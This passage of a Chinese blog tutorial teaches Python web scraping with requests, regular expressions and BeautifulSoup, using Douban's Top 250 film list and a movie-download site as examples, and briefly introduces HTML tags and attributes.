class="keyword">for</span> it <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(it.group(<span class="string">&quot;name&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(it.group(<span class="string">&quot;score&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(it.group(<span class="string">&quot;num&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(it.group(<span class="string">&quot;year&quot;</span>).strip())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074023.jpg"                      alt="image-20220907160353737"                ></p><p>​    保存到文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拿到页面源代码 requests</span></span><br><span class="line"><span class="comment"># 通过re来提取想要的信息 re</span></span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://movie.douban.com/top250&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                  <span class="string">&quot;Chrome/104.0.0.0 Safari/537.36 &quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.get(url, headers=headers)</span><br><span class="line">page_content = resp.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析数据</span></span><br><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;li&gt;.*?&lt;div class=&quot;item&quot;&gt;.*?&lt;span class=&quot;title&quot;&gt;(?P&lt;name&gt;.*?)&lt;/span&gt;.*?&#x27;</span></span><br><span class="line">                 <span class="string">r&#x27;&lt;p class=&quot;&quot;&gt;.*?&lt;br&gt;(?P&lt;year&gt;.*?)&amp;nbsp.*?&#x27;</span></span><br><span class="line">                 <span class="string">r&#x27;&lt;span class=&quot;rating_num&quot; property=&quot;v:average&quot;&gt;(?P&lt;score&gt;.*?)&lt;/span&gt;.*?&#x27;</span></span><br><span class="line">                 <span class="string">r&#x27;&lt;span&gt;(?P&lt;num&gt;.*?)人评价&lt;/span&gt;&#x27;</span>, re.S)</span><br><span class="line">result = obj.finditer(page_content)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;data.csv&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">csvwriter = csv.writer(f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> it <span class="keyword">in</span> result:</span><br><span class="line">    <span class="comment"># print(it.group(&quot;name&quot;))</span></span><br><span class="line">    <span class="comment"># print(it.group(&quot;score&quot;))</span></span><br><span class="line">    <span class="comment"># print(it.group(&quot;num&quot;))</span></span><br><span class="line">    <span class="comment"># print(it.group(&quot;year&quot;).strip())</span></span><br><span class="line">    dic = it.groupdict()</span><br><span class="line">    dic[<span class="string">&#x27;year&#x27;</span>] = dic[<span class="string">&#x27;year&#x27;</span>].strip()</span><br><span class="line">    csvwriter.writerow(dic.values())</span><br><span class="line"></span><br><span class="line">resp.close()</span><br><span class="line">f.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;over!&quot;</span>)</span><br></pre></td></tr></table></figure><p>​    目前我们只能抓到前25条。事实上只要修改url变可以拿到全部数据，后续有时间补全。</p><h4 id="电影天堂yyds"><a href="#电影天堂yyds" class="headerlink" title="电影天堂yyds"></a>电影天堂yyds</h4><p>​    需要以下三步</p><p>​    1、定位到2022必看片</p><p>​    2、从2022必看片中提取到子页面的链接地址</p><p>​    3、请求子页面的链接地址。拿到我们想要的下载地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">domain = <span class="string">&quot;https://www.dytt89.com/&quot;</span></span><br><span class="line">resp = requests.get(domain)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><p>​    先拿到页面数据，应该是这样的</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074024.jpg"                      alt="image-20220907204713566"                ></p><p>​    如果报错的话，设置verify=False，且设置编码格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">domain = <span class="string">&quot;https://www.dytt89.com/&quot;</span></span><br><span class="line">resp = requests.get(domain, verify=<span class="literal">False</span>)</span><br><span class="line">resp.encoding = <span class="string">&#x27;gb2312&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074026.jpg"                      alt="image-20220907205117836"                ></p><p>​    然后拿到ul里的li，也就是2022必看热片里的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">domain = <span class="string">&quot;https://www.dytt89.com/&quot;</span></span><br><span class="line">resp = requests.get(domain, verify=<span class="literal">False</span>)</span><br><span class="line">resp.encoding = <span class="string">&#x27;gb2312&#x27;</span></span><br><span class="line"></span><br><span class="line">obj1 = re.<span class="built_in">compile</span>(<span class="string">r&quot;2022必看热片.*?&lt;ul&gt;(?P&lt;ul&gt;.*?)&lt;/ul&gt;&quot;</span>, re.S)</span><br><span class="line">result1 = obj1.finditer(resp.text)</span><br><span class="line"><span class="keyword">for</span> it <span class="keyword">in</span> result1:</span><br><span class="line">    ul = it.group(<span class="string">&#x27;ul&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ul)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074027.jpg"                      alt="image-20220907210337215"                ></p><p>​    接下类进行第二件事，从2022必看片中提取到子页面的链接地址</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074028.jpg"                      alt="image-20220907210923606"                ></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">domain = <span class="string">&quot;https://www.dytt89.com/&quot;</span></span><br><span class="line">resp = requests.get(domain, verify=<span class="literal">False</span>)</span><br><span class="line">resp.encoding = <span class="string">&#x27;gb2312&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拿到ul里的li</span></span><br><span class="line">obj1 = re.<span class="built_in">compile</span>(<span class="string">r&quot;2022必看热片.*?&lt;ul&gt;(?P&lt;ul&gt;.*?)&lt;/ul&gt;&quot;</span>, re.S)</span><br><span class="line">obj2 = re.<span class="built_in">compile</span>(<span class="string">r&quot;&lt;a href=&#x27;(?P&lt;href&gt;.*?)&#x27;&quot;</span>,re.S)</span><br><span class="line">result1 = obj1.finditer(resp.text)</span><br><span class="line"><span class="keyword">for</span> it <span class="keyword">in</span> result1:</span><br><span class="line">    ul = it.group(<span class="string">&#x27;ul&#x27;</span>)</span><br><span class="line"><span class="comment"># 提取子页面链接</span></span><br><span class="line">    result2 = obj2.finditer(ul)</span><br><span class="line">    <span class="keyword">for</span> itt <span class="keyword">in</span> result2:</span><br><span class="line">        <span class="built_in">print</span>(itt.group(<span class="string">&#x27;href&#x27;</span>))</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074029.jpg"                      alt="image-20220907211829463"                ></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">domain = <span class="string">&quot;https://www.dytt89.com/&quot;</span></span><br><span class="line">resp = requests.get(domain, verify=<span class="literal">False</span>)</span><br><span class="line">resp.encoding = <span class="string">&#x27;gb2312&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拿到ul里的li</span></span><br><span class="line">obj1 = re.<span class="built_in">compile</span>(<span class="string">r&quot;2022必看热片.*?&lt;ul&gt;(?P&lt;ul&gt;.*?)&lt;/ul&gt;&quot;</span>, re.S)</span><br><span class="line">obj2 = re.<span class="built_in">compile</span>(<span class="string">r&quot;&lt;a href=&#x27;(?P&lt;href&gt;.*?)&#x27;&quot;</span>, re.S)</span><br><span class="line">obj3 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;◎片　　名(?P&lt;movie&gt;.*?)&lt;br /&gt;.*? &lt;td &#x27;</span></span><br><span class="line">                  <span class="string">r&#x27;style=&quot;WORD-WRAP: break-word&quot; bgcolor=&quot;#fdfddf&quot;&gt;&lt;a href=&quot;(?P&lt;download&gt;.*?)&quot;&gt;&#x27;</span>, re.S)</span><br><span class="line"></span><br><span class="line">result1 = obj1.finditer(resp.text)</span><br><span class="line"></span><br><span class="line">child_href_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> it <span class="keyword">in</span> result1:</span><br><span class="line">    ul = it.group(<span class="string">&#x27;ul&#x27;</span>)</span><br><span class="line">    <span class="comment"># 提取子页面链接</span></span><br><span class="line">    result2 = obj2.finditer(ul)</span><br><span class="line">    <span class="keyword">for</span> itt <span class="keyword">in</span> result2:</span><br><span class="line">        <span class="comment"># 拼接子页面的url地址：域名 + 子页面地址</span></span><br><span class="line">        child_href = domain + itt.group(<span class="string">&#x27;href&#x27;</span>).strip(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">        child_href_list.append(child_href)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取子页面内容</span></span><br><span class="line"><span class="keyword">for</span> href <span class="keyword">in</span> child_href_list:</span><br><span class="line">    child_resp = requests.get(href, verify=<span class="literal">False</span>)</span><br><span class="line">    child_resp.encoding = <span class="string">&#x27;gb2312&#x27;</span></span><br><span class="line">    result3 = obj3.search(child_resp.text)</span><br><span class="line">    <span class="built_in">print</span>(result3.group(<span class="string">&quot;movie&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(result3.group(<span class="string">&quot;download&quot;</span>))</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074031.jpg"                      alt="image-20220907214048829"                ></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> aifc</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">domain = <span class="string">&quot;https://www.dytt89.com/&quot;</span></span><br><span class="line">resp = requests.get(domain)</span><br><span class="line">resp.encoding = <span class="string">&#x27;gb2312&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拿到ul里的li</span></span><br><span class="line">obj1 = re.<span class="built_in">compile</span>(<span class="string">r&quot;2022必看热片.*?&lt;ul&gt;(?P&lt;ul&gt;.*?)&lt;/ul&gt;&quot;</span>, re.S)</span><br><span class="line">obj2 = re.<span class="built_in">compile</span>(<span class="string">r&quot;&lt;a href=&#x27;(?P&lt;href&gt;.*?)&#x27;&quot;</span>, re.S)</span><br><span class="line">obj3 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;◎片　　名(?P&lt;movie&gt;.*?)&lt;br /&gt;.*? &lt;td &#x27;</span></span><br><span class="line">                  <span class="string">r&#x27;style=&quot;WORD-WRAP: break-word&quot; bgcolor=&quot;#fdfddf&quot;&gt;&lt;a href=&quot;(?P&lt;download&gt;.*?)&quot;&gt;&#x27;</span>, re.S)</span><br><span class="line"></span><br><span class="line">result1 = obj1.finditer(resp.text)</span><br><span class="line"></span><br><span class="line">child_href_list = []</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;dytt.csv&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">csvwrite1 = csv.writer(f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> it <span class="keyword">in</span> result1:</span><br><span class="line">    ul = it.group(<span class="string">&#x27;ul&#x27;</span>)</span><br><span class="line">    <span class="comment"># 提取子页面链接</span></span><br><span class="line">    result2 = obj2.finditer(ul)</span><br><span class="line">    <span class="keyword">for</span> itt <span class="keyword">in</span> result2:</span><br><span class="line">        <span class="comment"># 拼接子页面的url地址：域名 + 子页面地址</span></span><br><span class="line">        child_href = domain + itt.group(<span class="string">&#x27;href&#x27;</span>).strip(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">        child_href_list.append(child_href)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取子页面内容</span></span><br><span class="line"><span class="keyword">for</span> href <span class="keyword">in</span> child_href_list:</span><br><span class="line">    child_resp = requests.get(href)</span><br><span class="line">    child_resp.encoding = <span class="string">&#x27;gb2312&#x27;</span></span><br><span class="line">    result3 = obj3.finditer(child_resp.text)</span><br><span class="line">    <span class="keyword">for</span> ittt <span class="keyword">in</span> result3:</span><br><span class="line">        <span class="built_in">print</span>(ittt.group(<span class="string">&quot;movie&quot;</span>))</span><br><span class="line">        <span class="built_in">print</span>(ittt.group(<span class="string">&quot;download&quot;</span>))</span><br><span class="line">        dic = ittt.groupdict()</span><br><span class="line">        csvwrite1.writerow(dic.values())</span><br><span class="line"></span><br><span class="line">resp.close()</span><br><span class="line">f.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;over&quot;</span>)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074032.jpg"                      alt="image-20220907221714766"                ></p><h4 id="bs4解析前戏-html语法规则"><a href="#bs4解析前戏-html语法规则" class="headerlink" title="bs4解析前戏-html语法规则"></a>bs4解析前戏-html语法规则</h4><p>​    HTML(Hyper Text Markup Language)超⽂本标记语⾔, 是我们编写 ⽹⻚的最基本也是最核⼼的⼀种语⾔. 其语法规则就是⽤不同的标签 对⽹⻚上的内容进⾏标记, 从⽽使⽹⻚显示出不同的展示效果. </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;</span><br><span class="line"> 我爱你</span><br><span class="line">&lt;/h1&gt;</span><br></pre></td></tr></table></figure><p>​    上述代码的含义是在⻚⾯中显示”我爱你”三个字, 但是我爱你三个字 被”&lt;h1&gt;“和&lt;h1&gt;标记了. ⽩话就是被括起来了. 被H1这个标签括 起来了. 这个时候. 浏览器在展示的时候就会让我爱你变粗变⼤. 俗称 标题, 所以HTML的语法就是⽤类似这样的标签对⻚⾯内容进⾏标记. 不同的标签表现出来的效果也是不⼀样的.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">h1: ⼀级标题</span><br><span class="line">h2: ⼆级标题</span><br><span class="line">p: 段落</span><br><span class="line">font: 字体(被废弃了, 但能⽤)</span><br><span class="line">body: 主体</span><br></pre></td></tr></table></figure><p>​    标签我们明⽩了, 接下来就是属性了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;</span><br><span class="line"> 我爱你</span><br><span class="line">&lt;/h1&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">&#x27;right&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"> 我爱你妹</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>​    这两个标签都是h1标签, 都是⼀级标题, 但是下⾯这个会显示 在右边. 也就是说, 通过xxx=xxx这种形式对h1标签进⼀步的说明了. 那么这种语法在html中被称为标签的属性. 并且属性可以有很多个.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body text=<span class="string">&quot;green&quot;</span> bgcolor=<span class="string">&quot;#eee&quot;</span>&gt;</span><br><span class="line"> 你看我的颜⾊. 贼健康</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>​    有了这些知识, 我们再去看bs4就会得⼼应⼿了. 因为bs4就是通过标 签和属性去定位⻚⾯上的内容的.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;1&quot;</span> <span class="keyword">class</span>-<span class="string">&quot;h1&quot;</span>&gt;周杰伦&lt;/div&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;h1&quot;</span>&gt;</span>林俊杰<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id-</span>&quot;<span class="attr">3</span>&quot; <span class="attr">class</span>=<span class="string">&quot;h1&quot;</span>&gt;</span>麻花藤<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;4&quot;</span> <span class="attr">class</span>=<span class="string">&quot;h1&quot;</span>&gt;</span>天老鸭<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id-</span>&quot;<span class="attr">5</span>&quot; <span class="attr">class</span>=<span class="string">&quot;h4&quot;</span>&gt;</span>李多海<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;5&quot;</span> <span class="attr">cLass</span>=<span class="string">&quot;h5&quot;</span>&gt;</span>厉害多<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span>XXxxx<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line">＃ 通过标签名称来拿到数据</span><br><span class="line"># div -&gt; <span class="attr">id</span>:<span class="number">3</span> =&gt; 麻花藤</span><br><span class="line"># div -&gt; <span class="attr">class</span>:<span class="function"><span class="params">h4</span> =&gt;</span> 李多海</span><br><span class="line"># bs4</span><br></pre></td></tr></table></figure><h4 id="bs4解析入门-豆瓣top获取"><a href="#bs4解析入门-豆瓣top获取" class="headerlink" title="bs4解析入门-豆瓣top获取"></a>bs4解析入门-豆瓣top获取</h4><p>​    1、拿到页面源代码，和之前类似</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://movie.douban.com/top250?start=0&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                  <span class="string">&quot;Chrome/104.0.0.0 Safari/537.36 &quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.get(url, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><p>​    2、把页面源码交给Beautifulsoup处理，生成bs对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、把页面源码交给Beautifulsoup处理，生成bs4对象</span></span><br><span class="line">page = BeautifulSoup(resp.text)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074033.jpg"                      alt="image-20220909160846391"                ></p><p>​    这是因为bs不知道是什么类型的源码，会先当成html解析。我们告诉他是html即可消除</p><p>​    3、从bs对象中查找数据</p><p>​    find(标签，属性=值) 只找第一个</p><p>​    find_all(标签，属性=值) 全部都找</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、拿到页面源代码</span></span><br><span class="line"><span class="comment"># 2、使用bs4进行解析，拿到数据</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://movie.douban.com/top250?start=0&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                  <span class="string">&quot;Chrome/104.0.0.0 Safari/537.36 &quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.get(url, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析数据</span></span><br><span class="line"><span class="comment"># 1、把页面源码交给Beautifulsoup处理，生成bs4对象</span></span><br><span class="line">page = BeautifulSoup(resp.text, <span class="string">&quot;html.parser&quot;</span>)  <span class="comment"># 指定html解析器</span></span><br><span class="line"><span class="comment"># 2、从bs对象中查找数据</span></span><br><span class="line"><span class="comment"># find(标签，属性=值) 只找第一个</span></span><br><span class="line"><span class="comment"># find_all(标签，属性=值) 全部都找</span></span><br><span class="line">title = page.find(<span class="string">&quot;span&quot;</span>, class_=<span class="string">&quot;title&quot;</span>)  <span class="comment"># class是python的关键字，所以要换个写法</span></span><br><span class="line"><span class="built_in">print</span>(title)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074035.jpg"                      alt="image-20220909172836510"                ></p><p>​    另一种写法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、拿到页面源代码</span></span><br><span class="line"><span class="comment"># 2、使用bs4进行解析，拿到数据</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://movie.douban.com/top250?start=0&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                  <span class="string">&quot;Chrome/104.0.0.0 Safari/537.36 &quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.get(url, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析数据</span></span><br><span class="line"><span class="comment"># 1、把页面源码交给Beautifulsoup处理，生成bs4对象</span></span><br><span class="line">page = BeautifulSoup(resp.text, <span class="string">&quot;html.parser&quot;</span>)  <span class="comment"># 指定html解析器</span></span><br><span class="line"><span class="comment"># 2、从bs对象中查找数据</span></span><br><span class="line"><span class="comment"># find(标签，属性=值) 只找第一个</span></span><br><span class="line"><span class="comment"># find_all(标签，属性=值) 全部都找</span></span><br><span 